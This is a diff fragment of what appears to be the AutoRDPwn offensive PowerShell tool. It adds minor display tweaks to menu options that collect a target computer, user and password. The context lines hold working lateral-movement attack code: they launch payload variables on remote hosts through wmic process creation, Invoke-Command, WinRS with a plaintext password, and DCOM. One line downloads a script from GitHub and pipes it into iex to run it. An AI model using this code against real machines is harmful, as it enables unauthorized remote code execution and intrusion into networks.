@@ -247,9 +247,9 @@ if($Language -in 'Spanish') {
 
         '2' {
 	Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' }
+        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' ; Write-Host "localhost" }
         Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
-        $user = $Host.UI.ReadLine()
+        $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt26" -NoNewLine -ForegroundColor Gray
         $domain = $Host.UI.ReadLine()
         Write-Host ; Write-Host "$txt27" -NoNewLine -ForegroundColor Gray
@@ -264,12 +264,12 @@ if($Language -in 'Spanish') {
 
 	'3' {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' }
+        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' ; Write-Host "localhost" }
         Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
-        $user = $Host.UI.ReadLine()
+        $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+        if(!$PlainTextPassword) { Write-Host "******" } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
 	if(!$user) { wmic path win32_process call create "powershell.exe $Pwn1"
         wmic path win32_process call create "powershell.exe $Pwn2"
         wmic path win32_process call create "powershell.exe $Pwn3"
@@ -281,12 +281,12 @@ if($Language -in 'Spanish') {
 
         '4' {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' }
+        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' ; Write-Host "localhost" }
         Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
-        $user = $Host.UI.ReadLine()
+        $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
         $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+        if(!$credential) { Write-Host "******" } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         if(!$user) { Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn1 }
         Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn2 }
         Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn3 }
@@ -298,12 +298,12 @@ if($Language -in 'Spanish') {
 
         '5' {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' }
+        $computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' ; Write-Host "localhost" }
         Write-Host ; Write-Host "$txt24" -NoNewLine -ForegroundColor Gray
-        $user = $Host.UI.ReadLine()
+        $user = $Host.UI.ReadLine() ; if(!$user) { Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+	if(!$PlainTextPassword) { Write-Host "******" } ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn1"
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn2"
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn3"
@@ -319,7 +319,7 @@ if($Language -in 'Spanish') {
 
 	'7' {
 	Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray
-	$computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' }
+	$computer = $Host.UI.ReadLine() ; if(!$computer) { $computer = 'localhost' ; Write-Host "localhost" }
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
 	Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-DCOM.ps1" -UseBasicParsing | iex
 	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn1"
